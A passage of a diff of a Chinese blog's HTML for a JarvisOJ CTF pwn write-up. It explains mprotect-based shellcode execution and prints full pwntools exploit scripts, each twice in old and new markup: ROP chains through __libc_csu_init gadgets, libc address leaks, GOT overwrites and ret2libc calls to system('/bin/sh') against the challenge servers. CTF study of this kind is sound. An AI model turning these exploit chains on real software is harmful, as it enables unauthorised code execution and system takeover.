 总得来说，mmap对于我们的作用就是在程序虚拟空间产生一段可读写、可执行的内存段，对于是哪个文件映射过来我们并不关心，但是为了避免我们在内存段中写入ShellCode回写至被映射的文件而产生莫名的错误，我建议选择<code>MAP_PRIVATE</code>即修改时会产生一个内存副本，而不会修改被映射的文件内容。而第五个参数是被映射文件的文件描述符<code>fd</code>，我们知道平常我们得到的文件描述符是由<code>fopen</code>这类函数的返回值得到的，默认的0是<code>stdin</code>,1是<code>stdout</code>。由于我们并不想知道也并不关心哪个文件或者区域被映射到内存中所以我建议使用匿名映射–<code>MAP_ANONYMOUS</code>。如上秒描述的一样，当<code>MAP_ANONYMOUS</code>时，文件描述符<code>fd</code>会被置为<code>-1</code>被无视掉，更为贴切我们不在乎谁被映射的要求。<br>
-先写一个C程序把<code>flags</code>属性对应的值输出来看一下</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/14-39-45.jpg" alt="14-39-45.jpg" title="">
-<p>接下来我们就是要构造这样的函数调用</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//原型</span></div><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">( <span class="keyword">void</span> *start , <span class="keyword">size_t</span> length , <span class="keyword">int</span> prot , <span class="keyword">int</span> flags , <span class="keyword">int</span> fd , <span class="keyword">off_t</span> offsize)</span></span></div><div class="line"><span class="function"><span class="comment">//构造函数调用</span></span></div><div class="line"><span class="function"><span class="title">mmap</span><span class="params">(segment_addr , <span class="number">0x1000</span> , <span class="number">0x111</span> ,<span class="number">32</span>+<span class="number">2</span> ,<span class="number">-1</span> , <span class="number">0</span> )</span></span></div></pre></td></tr></table></figure>
+先写一个C程序把<code>flags</code>属性对应的值输出来看一下<br>
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/14-39-45.jpg" alt=""><br>
+接下来我们就是要构造这样的函数调用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//原型</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">( <span class="keyword">void</span> *start , <span class="keyword">size_t</span> length , <span class="keyword">int</span> prot , <span class="keyword">int</span> flags , <span class="keyword">int</span> fd , <span class="keyword">off_t</span> offsize)</span></span></span><br><span class="line"><span class="function"><span class="comment">//构造函数调用</span></span></span><br><span class="line"><span class="function"><span class="title">mmap</span><span class="params">(segment_addr , <span class="number">0x1000</span> , <span class="number">0x111</span> ,<span class="number">32</span>+<span class="number">2</span> ,<span class="number">-1</span> , <span class="number">0</span> )</span></span></span><br></pre></td></tr></table></figure>
 <p>但是最主要的问题是mmap需要6个参数，而这个程序是64bit的。所以很难找到这样的一个gadget能够控制<code>rdi rsi rdx rcx r8 r9</code>这六个寄存器的。所以我们采用参数更少的<code>mprotect</code>函数<br>
-PS :当然，寻找控制6个参数的gadget的方法是存在的，可利用的是<code>_dl_runtime_resolve</code>函数。详见蒸米的文章<a href="http://www.vuln.cn/6643" target="_blank" rel="external">一步一步学ROP之gadgets和2free篇 - 蒸米</a>。32bit的程序则不存在这种问题。<br>
+PS :当然，寻找控制6个参数的gadget的方法是存在的，可利用的是<code>_dl_runtime_resolve</code>函数。详见蒸米的文章<a href="http://www.vuln.cn/6643" target="_blank" rel="noopener">一步一步学ROP之gadgets和2free篇 - 蒸米</a>。32bit的程序则不存在这种问题。<br>
 函数<code>_dl_runtime_resolve</code>在这题的链接库<code>ld.2.19.so</code>版本中是存在的，而在我本地是<code>ld.2.26.so</code>，并不存在<code>_dl_runtime_resolve</code>，取而代之的是<code>_dl_runtime_resolve_avx_slow</code>，所以这个gadget还受目标系统so文件版本的影响。故不推荐在64bit程序下使用<code>mmap</code>函数<br>
-<code>ld.2.19.so</code>下载地址: <a href="https://opensuse.pkgs.org/42.1/opensuse-update-oss/glibc-2.19-22.1.x86_64.rpm.html" target="_blank" rel="external">https://opensuse.pkgs.org/42.1/opensuse-update-oss/glibc-2.19-22.1.x86_64.rpm.html</a></p>
+<code>ld.2.19.so</code>下载地址: <a href="https://opensuse.pkgs.org/42.1/opensuse-update-oss/glibc-2.19-22.1.x86_64.rpm.html" target="_blank" rel="noopener">https://opensuse.pkgs.org/42.1/opensuse-update-oss/glibc-2.19-22.1.x86_64.rpm.html</a></p>
 <hr>
 <h2 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h2>
 <blockquote>
@@ -627,7 +374,7 @@ PS :当然，寻找控制6个参数的gadget的方法是存在的，可利用的
 </ol>
 </blockquote>
 <p>poc:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</div><div class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9884</span>)</div><div class="line"><span class="comment">#context.log_level = 'debug'</span></div><div class="line">context.arch = <span class="string">'amd64'</span></div><div class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></div><div class="line">	pro.recvuntil(recv_buf)</div><div class="line">	<span class="keyword">if</span> new_line:</div><div class="line">		pro.sendline(send_buf)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		pro.send(send_buf)</div><div class="line"></div><div class="line">rdi_ret_addr = <span class="number">0x4006b3</span></div><div class="line">vulnerable_addr = <span class="number">0x40062E</span></div><div class="line">data_addr = elf.bss()</div><div class="line"><span class="comment">#__libc_csu_init 通用gadget</span></div><div class="line">init_gadget1 = <span class="number">0x4006AA</span></div><div class="line">init_gadget2 = <span class="number">0x400690</span></div><div class="line"><span class="comment">#__libc_csu_init 通用gadget构造一个可循环利用的call函数，前提是需要知道got地址，且got地址对应的数据是真实内存地址</span></div><div class="line"><span class="comment">#看不懂为什么这么构造的可以看我上一篇文章《百度杯11月pwnme》倒数第二段代码处的注释解释有__libc_csu_init 通用gadget的利用</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_call</span><span class="params">(func_got,arg1,arg2,arg3,returnData=False)</span>:</span></div><div class="line">	Data = <span class="string">""</span></div><div class="line">	payload = <span class="string">"A"</span>*<span class="number">0x88</span></div><div class="line">	payload += p64(init_gadget1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(func_got)+p64(arg3)+p64(arg2)+p64(arg1)</div><div class="line">	payload += p64(init_gadget2)+p64(<span class="number">0x1</span>)*<span class="number">7</span></div><div class="line">	payload += p64(vulnerable_addr)</div><div class="line">	respone(<span class="string">"Input:\n"</span>,payload)</div><div class="line">	<span class="keyword">if</span> returnData:</div><div class="line">		Data = u64(pro.recv(<span class="number">8</span>))</div><div class="line">	<span class="keyword">return</span> Data</div><div class="line"></div><div class="line">read_addr = _call(elf.got[<span class="string">'write'</span>],<span class="number">1</span>,elf.got[<span class="string">'read'</span>],<span class="number">8</span>,<span class="keyword">True</span>)<span class="comment">#读出read的真实内存地址</span></div><div class="line">log.info(<span class="string">'read_addr:%s'</span>,hex(read_addr))</div><div class="line">imageBase = read_addr - libc.symbols[<span class="string">'read'</span>]<span class="comment">#计算imageBase</span></div><div class="line">mprotect_addr = imageBase + libc.symbols[<span class="string">'mprotect'</span>]<span class="comment">#mprotect内存地址</span></div><div class="line"></div><div class="line">shell = asm(shellcraft.amd64.sh())<span class="comment">#利用pwntools的shellcraft生成64位shellcode</span></div><div class="line">log.info(<span class="string">'Writing Shell Code....'</span>)</div><div class="line">_call(elf.got[<span class="string">'read'</span>],<span class="number">0</span>,data_addr,len(shell))<span class="comment">#调用read函数将ShellCode写入bss段</span></div><div class="line">pro.send(shell)</div><div class="line">log.info(<span class="string">'Done!'</span>)</div><div class="line"></div><div class="line">log.info(<span class="string">'Hijacking __libc_start_main Address....'</span>)</div><div class="line">_call(elf.got[<span class="string">'read'</span>],<span class="number">0</span>,elf.got[<span class="string">'__libc_start_main'</span>],<span class="number">8</span>)<span class="comment">#修改__libc_start_main的got表地址成为我们mprotect地址</span></div><div class="line">pro.send(p64(mprotect_addr))</div><div class="line">log.info(<span class="string">'Done!'</span>)</div><div class="line"></div><div class="line">log.info(<span class="string">'Calling mprotect....'</span>)</div><div class="line">_call(elf.got[<span class="string">'__libc_start_main'</span>],<span class="number">0x00600000</span>,<span class="number">0x1000</span>,<span class="number">7</span>)<span class="comment">#调用__libc_start_main函数，其实是调用mprotect函数，修改内存段成为可读写可执行的权限</span></div><div class="line">log.info(<span class="string">'Done!'</span>)</div><div class="line"></div><div class="line">log.info(<span class="string">'Geting shell...'</span>)</div><div class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></div><div class="line">payload += p64(data_addr)<span class="comment">#调用ShellCode</span></div><div class="line">respone(<span class="string">"Input:\n"</span>,payload)</div><div class="line">pro.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9884</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></span><br><span class="line">	pro.recvuntil(recv_buf)</span><br><span class="line">	<span class="keyword">if</span> new_line:</span><br><span class="line">		pro.sendline(send_buf)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		pro.send(send_buf)</span><br><span class="line"></span><br><span class="line">rdi_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">vulnerable_addr = <span class="number">0x40062E</span></span><br><span class="line">data_addr = elf.bss()</span><br><span class="line"><span class="comment">#__libc_csu_init 通用gadget</span></span><br><span class="line">init_gadget1 = <span class="number">0x4006AA</span></span><br><span class="line">init_gadget2 = <span class="number">0x400690</span></span><br><span class="line"><span class="comment">#__libc_csu_init 通用gadget构造一个可循环利用的call函数，前提是需要知道got地址，且got地址对应的数据是真实内存地址</span></span><br><span class="line"><span class="comment">#看不懂为什么这么构造的可以看我上一篇文章《百度杯11月pwnme》倒数第二段代码处的注释解释有__libc_csu_init 通用gadget的利用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_call</span><span class="params">(func_got,arg1,arg2,arg3,returnData=False)</span>:</span></span><br><span class="line">	Data = <span class="string">""</span></span><br><span class="line">	payload = <span class="string">"A"</span>*<span class="number">0x88</span></span><br><span class="line">	payload += p64(init_gadget1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(func_got)+p64(arg3)+p64(arg2)+p64(arg1)</span><br><span class="line">	payload += p64(init_gadget2)+p64(<span class="number">0x1</span>)*<span class="number">7</span></span><br><span class="line">	payload += p64(vulnerable_addr)</span><br><span class="line">	respone(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">	<span class="keyword">if</span> returnData:</span><br><span class="line">		Data = u64(pro.recv(<span class="number">8</span>))</span><br><span class="line">	<span class="keyword">return</span> Data</span><br><span class="line"></span><br><span class="line">read_addr = _call(elf.got[<span class="string">'write'</span>],<span class="number">1</span>,elf.got[<span class="string">'read'</span>],<span class="number">8</span>,<span class="keyword">True</span>)<span class="comment">#读出read的真实内存地址</span></span><br><span class="line">log.info(<span class="string">'read_addr:%s'</span>,hex(read_addr))</span><br><span class="line">imageBase = read_addr - libc.symbols[<span class="string">'read'</span>]<span class="comment">#计算imageBase</span></span><br><span class="line">mprotect_addr = imageBase + libc.symbols[<span class="string">'mprotect'</span>]<span class="comment">#mprotect内存地址</span></span><br><span class="line"></span><br><span class="line">shell = asm(shellcraft.amd64.sh())<span class="comment">#利用pwntools的shellcraft生成64位shellcode</span></span><br><span class="line">log.info(<span class="string">'Writing Shell Code....'</span>)</span><br><span class="line">_call(elf.got[<span class="string">'read'</span>],<span class="number">0</span>,data_addr,len(shell))<span class="comment">#调用read函数将ShellCode写入bss段</span></span><br><span class="line">pro.send(shell)</span><br><span class="line">log.info(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'Hijacking __libc_start_main Address....'</span>)</span><br><span class="line">_call(elf.got[<span class="string">'read'</span>],<span class="number">0</span>,elf.got[<span class="string">'__libc_start_main'</span>],<span class="number">8</span>)<span class="comment">#修改__libc_start_main的got表地址成为我们mprotect地址</span></span><br><span class="line">pro.send(p64(mprotect_addr))</span><br><span class="line">log.info(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'Calling mprotect....'</span>)</span><br><span class="line">_call(elf.got[<span class="string">'__libc_start_main'</span>],<span class="number">0x00600000</span>,<span class="number">0x1000</span>,<span class="number">7</span>)<span class="comment">#调用__libc_start_main函数，其实是调用mprotect函数，修改内存段成为可读写可执行的权限</span></span><br><span class="line">log.info(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'Geting shell...'</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></span><br><span class="line">payload += p64(data_addr)<span class="comment">#调用ShellCode</span></span><br><span class="line">respone(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
 <p><strong>Flag : CTF{9c3a234bd804292b153e7a1c25da648c}</strong></p>
 <h1 id="level-6"><a class="markdownIt-Anchor" href="#level-6"></a> level 6</h1>
 <p><em>正在努力学习堆利用，待我学成之日。。。再另开一片文章详细解释对利用以及补充此题</em></p>
@@ -636,9 +383,9 @@ PS :当然，寻找控制6个参数的gadget的方法是存在的，可利用的
 由于32位是栈上传参和64位是先由寄存器<code>rdi</code>,<code>rsi</code>,<code>rdx</code>,<code>rcx</code>,<code>r8</code>,<code>r9</code>传递前6位参数，再多的参数就丢栈上传递<br>
 所以我们需要找到一些<code>gadget</code>帮助我们传递<code>/bin/sh</code>进<code>rdi</code><br>
 之前的文章已经教了如何寻找<code>gadget</code>，此处我们直接用<code>ROPgadget</code>工具寻找</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/00-38-15.jpg" alt="00-38-15.jpg" title="">
-<p>万事俱备，poc如下:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"><span class="comment">#pro = process("./level2_x64")</span></div><div class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9882</span>)</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">elf = ELF(<span class="string">"./level2_x64"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></div><div class="line">	pro.recvuntil(recv_buf)</div><div class="line">	<span class="keyword">if</span> new_line:</div><div class="line">		pro.sendline(send_buf)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		pro.send(send_buf)</div><div class="line">pop_rdi_ret_addr = <span class="number">0x4006b3</span></div><div class="line">bin_sh_addr = <span class="number">0x600A90</span></div><div class="line">system_addr = <span class="number">0x40063E</span></div><div class="line"></div><div class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></div><div class="line">payload += p64(pop_rdi_ret_addr)+p64(bin_sh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line">respone(<span class="string">"Input:\n"</span>,payload)</div><div class="line">pro.interactive()</div></pre></td></tr></table></figure>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/00-38-15.jpg" alt=""><br>
+万事俱备，poc如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#pro = process("./level2_x64")</span></span><br><span class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9882</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level2_x64"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></span><br><span class="line">	pro.recvuntil(recv_buf)</span><br><span class="line">	<span class="keyword">if</span> new_line:</span><br><span class="line">		pro.sendline(send_buf)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		pro.send(send_buf)</span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">system_addr = <span class="number">0x40063E</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></span><br><span class="line">payload += p64(pop_rdi_ret_addr)+p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">respone(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
 <p><strong>Flag: CTF{081ecc7c8d658409eb43358dcc1cf446}</strong></p>
 <h1 id="level-3-x64"><a class="markdownIt-Anchor" href="#level-3-x64"></a> level 3 x64</h1>
 <p>与32位的level3也差不多，给了<code>libc</code>，给了溢出点，然后思路还是一样，就是要寻找<code>gadget</code>这点不同</p>
@@ -650,28 +397,28 @@ PS :当然，寻找控制6个参数的gadget的方法是存在的，可利用的
 本题我使用的是通用<code>gadget</code>函数<code>_libc_csu_init()</code>,该函数是用gcc编译的时候自带的，所以很通用。如何利用<code>_libc_csu_init()</code>函数构造ROP上文以及上一篇文章已经说过了，就不再赘述了</li>
 </ol>
 <p>poc:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"><span class="comment">#pro = process("./level3_x64")</span></div><div class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</div><div class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9883</span>)</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></div><div class="line">	pro.recvuntil(recv_buf)</div><div class="line">	<span class="keyword">if</span> new_line:</div><div class="line">		pro.sendline(send_buf)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		pro.send(send_buf)</div><div class="line"></div><div class="line">rdi_ret_addr = <span class="number">0x4006b3</span></div><div class="line">vulnerable_addr = <span class="number">0x40062E</span></div><div class="line">init_gadget1 = <span class="number">0x4006AA</span></div><div class="line">init_gadget2 = <span class="number">0x400690</span></div><div class="line"></div><div class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></div><div class="line">payload += p64(init_gadget1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(elf.got[<span class="string">'write'</span>])+p64(<span class="number">8</span>)+p64(elf.got[<span class="string">'write'</span>])+p64(<span class="number">1</span>)<span class="comment">#调用write泄露write真是内存地址</span></div><div class="line">payload += p64(init_gadget2)+p64(<span class="number">0x1</span>)*<span class="number">7</span></div><div class="line">payload += p64(vulnerable_addr)<span class="comment">#重新回到漏洞函数处</span></div><div class="line">respone(<span class="string">"Input:\n"</span>,payload)</div><div class="line"></div><div class="line">data = u64(pro.recv(<span class="number">8</span>))</div><div class="line"><span class="comment">#计算基址以及函数地址</span></div><div class="line">imageBase = data - libc.symbols[<span class="string">'write'</span>]</div><div class="line">system_addr = imageBase + libc.symbols[<span class="string">'system'</span>]</div><div class="line">bin_sh_addr = imageBase + next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line"><span class="comment">#起shell</span></div><div class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></div><div class="line">payload += p64(rdi_ret_addr)+p64(bin_sh_addr)+p64(system_addr)</div><div class="line">respone(<span class="string">"Input:\n"</span>,payload)</div><div class="line">pro.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#pro = process("./level3_x64")</span></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9883</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></span><br><span class="line">	pro.recvuntil(recv_buf)</span><br><span class="line">	<span class="keyword">if</span> new_line:</span><br><span class="line">		pro.sendline(send_buf)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		pro.send(send_buf)</span><br><span class="line"></span><br><span class="line">rdi_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">vulnerable_addr = <span class="number">0x40062E</span></span><br><span class="line">init_gadget1 = <span class="number">0x4006AA</span></span><br><span class="line">init_gadget2 = <span class="number">0x400690</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></span><br><span class="line">payload += p64(init_gadget1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(elf.got[<span class="string">'write'</span>])+p64(<span class="number">8</span>)+p64(elf.got[<span class="string">'write'</span>])+p64(<span class="number">1</span>)<span class="comment">#调用write泄露write真是内存地址</span></span><br><span class="line">payload += p64(init_gadget2)+p64(<span class="number">0x1</span>)*<span class="number">7</span></span><br><span class="line">payload += p64(vulnerable_addr)<span class="comment">#重新回到漏洞函数处</span></span><br><span class="line">respone(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">data = u64(pro.recv(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#计算基址以及函数地址</span></span><br><span class="line">imageBase = data - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_addr = imageBase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = imageBase + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"><span class="comment">#起shell</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></span><br><span class="line">payload += p64(rdi_ret_addr)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">respone(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
 <p><strong>Flag: CTF{b1aeaa97fdcc4122533290b73765e4fd}</strong></p>
 <h1 id="test-your-memory"><a class="markdownIt-Anchor" href="#test-your-memory"></a> Test Your Memory</h1>
 <p>直接上IDA</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">mem_test</span><span class="params">(<span class="keyword">char</span> *s2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+15h] [bp-13h]@1</span></div><div class="line"></div><div class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">11u</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"\nwhat???? : "</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"0x%x \n"</span>, hint);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"cff flag go go go ...\n"</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</div><div class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;s);<span class="comment">//溢出点</span></div><div class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s, s2, <span class="number">4u</span>) )</div><div class="line">    result = <span class="built_in">puts</span>(<span class="string">"good job!!\n"</span>);</div><div class="line">  <span class="keyword">else</span></div><div class="line">    result = <span class="built_in">puts</span>(<span class="string">"cff flag is failed!!\n"</span>);</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
